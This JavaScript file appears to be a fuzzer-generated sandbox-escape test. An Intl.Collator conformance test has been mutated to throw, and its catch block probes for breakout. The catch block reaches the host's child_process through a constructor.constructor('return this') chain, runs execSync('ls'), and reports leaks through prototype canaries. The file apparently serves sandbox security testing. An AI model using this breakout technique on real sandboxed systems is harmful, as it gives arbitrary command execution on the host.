try {
    var options = [
        {
            key: 'kn',
            property: 'numeric',
            type: 'boolean',
            values: [
                true,
                false
            ]
        },
        {
            key: 'kf',
            property: 'caseFirst',
            type: 'string',
            values: [
                'upper',
                'lower',
                'false'
            ]
        }
    ];
    options.forEach(function (option) {
        let REPLACER = 23;
        var defaultLocale = new Intl.Collator().resolvedOptions().locale;
        var collator, opt, result;
        var supportedValues = [];
        option.values.forEach(function (value) {
            let REPLACER = 23;
            opt = {};
            opt[option.property] = value;
            collator = new Intl.Collator([defaultLocale], opt);
            result = collator.resolvedOptions()[option.property];
            if (result !== undefined && supportedValues.indexOf(result) === -1) {
                supportedValues.push(result);
            }
        });
        supportedValues.forEach(function (value) {
            let REPLACER = 23;
            collator = new Intl.Collator([defaultLocale + '-u-' + option.key + '-' + value]);
            result = collator.resolvedOptions()[option.property];
            assert.sameValue(result, value, 'Property ' + option.property + ' couldn\'t be set through locale extension key ' + option.key + '.');
        });
        supportedValues.forEach(function (value) {
            throw () => {
                return () => {
                };
            };
            var otherValue;
            option.values.forEach(function (possibleValue) {
                if (possibleValue !== value) {
                    otherValue = possibleValue;
                }
            });
            if (otherValue !== undefined) {
                opt = {};
                opt[option.property] = value;
                collator = new Intl.Collator([defaultLocale + '-u-' + option.key + '-' + otherValue], opt);
                result = collator.resolvedOptions()[option.property];
                assert.sameValue(result, value, 'Options value for property ' + option.property + ' doesn\'t override locale extension key ' + option.key + '.');
            }
        });
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}